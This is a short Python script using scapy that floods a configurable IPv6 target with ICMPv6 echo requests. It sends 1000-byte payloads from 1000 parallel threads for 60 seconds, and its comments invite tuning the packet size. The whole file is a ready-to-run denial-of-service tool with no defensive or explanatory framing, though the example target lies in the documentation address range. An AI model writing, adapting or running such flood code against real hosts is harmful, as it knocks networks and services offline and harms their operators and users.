from scapy.all import IPv6, ICMPv6EchoRequest, send
import threading
import time

def ICMPv6Flood(TARGET, DURATION, PAYLOAD_SIZE):
    # Modify the payload to be the desired size (1000 bytes in this example)
    payload = b'\x00' * PAYLOAD_SIZE  # Replace with your desired payload

    # Construct the packet including the payload
    ICMPv6 = IPv6(dst=TARGET) / ICMPv6EchoRequest(data=payload)
    startTime = time.time()

    while time.time() - startTime < DURATION:
        try:
            send(ICMPv6, verbose=False)
        except Exception as e:
            print(f"Error sending packet: {e}")

if __name__ == "__main__":
    TARGET = "2001:db8:2:0:e65f:1ff:fe33:367d"
    DURATION = 60
    PAYLOAD_SIZE = 1000  # Adjust this value for your desired packet size
    NUM_THREADS=1000
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=ICMPv6Flood, args=(TARGET, DURATION, PAYLOAD_SIZE))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
